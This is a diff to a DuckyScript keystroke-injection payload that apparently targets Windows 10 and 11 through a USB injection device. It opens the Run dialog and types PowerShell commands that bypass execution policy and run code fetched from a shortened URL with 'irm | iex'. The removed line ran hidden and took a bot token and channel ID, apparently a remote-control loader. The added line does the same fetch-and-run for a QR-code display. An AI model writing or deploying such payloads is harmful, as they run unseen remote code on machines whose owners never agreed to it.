@@ -4,12 +4,13 @@ REM Author: @beigeworm
 REM Description: Uses Powershell to display a generated QR code from text or a URL
 REM Target: Windows 10 and 11
 
-REM some setup for dukie script
+REM SETUP
+REM Replace https://beigeworm.com with your url ot text string.
+
 DEFAULT_DELAY 100
 
-REM open powershell (remove "-W H" to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex
+STRING powershell -Ep Bypass -C $txt = 'https://beigeworm.com'; irm https://is.gd/bwpsqrcode | iex
 ENTER
